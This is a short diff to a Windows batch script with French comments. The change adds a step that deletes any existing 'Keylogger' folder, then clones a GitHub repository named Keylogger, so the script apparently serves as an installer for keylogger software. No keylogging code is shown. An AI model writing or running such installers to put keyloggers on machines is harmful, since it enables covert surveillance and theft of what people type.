@@ -27,7 +27,18 @@ if errorlevel 1 (
     git --version
 )
 
-REM Cloner le dépôt GitHub de manière sélective
+REM Supprimer le dossier existant Keylogger s'il existe
+if exist Keylogger (
+    echo Suppression du dossier existant Keylogger...
+    rmdir /s /q Keylogger
+    if errorlevel 1 (
+        echo Échec de la suppression du dossier Keylogger.
+        pause
+        exit /b
+    )
+)
+
+REM Cloner le dépôt GitHub
 echo Clonage du dépôt GitHub...
 git clone https://github.com/coco324/Keylogger.git
 if errorlevel 1 (
